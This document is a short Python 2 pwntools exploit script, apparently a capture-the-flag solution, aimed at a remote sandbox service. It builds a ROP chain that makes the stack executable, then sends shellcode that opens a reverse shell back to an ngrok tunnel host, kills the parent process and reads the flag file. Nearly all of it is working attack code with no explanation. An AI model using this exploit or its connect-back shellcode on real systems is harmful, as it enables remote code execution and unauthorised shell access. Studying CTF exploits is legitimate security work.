#!/usr/bin/env python2

from pwn import *
import socket

context.arch = "amd64"

r = remote("sandbox.chung96vn.cf", 1337)
l = listen(1337)

def uip(ip):
    parts = ip.split(".")
    res = ""

    for part in parts:
        res = res + p8(int(part))

    return res;

rop = ""
rop += "\x02\x00" # sin_family = AF_INET
rop += "\x3b\x78" # sin_port = 15224
rop += uip(socket.gethostbyname("0.tcp.ngrok.io")) # sin_addr
rop = rop.ljust(0x38, "\x00")
rop += p64(0x4816b6) # pop rax ; pop rdx ; pop rbx ; ret
rop += p64(0x6B8EF0) # _stack_prot
rop += p64(0x7)
rop += p64(0x0)
rop += p64(0x48cc91) # mov qword ptr [rax], rdx ; ret
rop += p64(0x400686) # pop rdi ; ret
rop += p64(0x6B8AB0) # _libc_stack_end
rop += p64(0x47F780) # _dl_make_stack_executable
rop += p64(0x4940c3) # jmp rsp

shellcode = asm("push SYS_socket; pop rax; cdq; push rdx; pop rsi; inc rsi; push rsi; pop rdi; inc rdi; syscall; push rax; pop rdi; mov rsi, rsp; sub rsi, 0x80; push 0x10; pop rdx; push SYS_connect; pop rax; syscall; push SYS_dup; pop rax; xor rdi, rdi; syscall; push SYS_getppid; pop rax; syscall; push rax; pop rdi; push 0x9; pop rsi; push SYS_kill; pop rax; syscall;") + asm(shellcraft.sh())

r.send(rop + shellcode)
l.wait_for_connection()
l.sendline("cat /home/sandbox/flag")
log.success(l.recv())
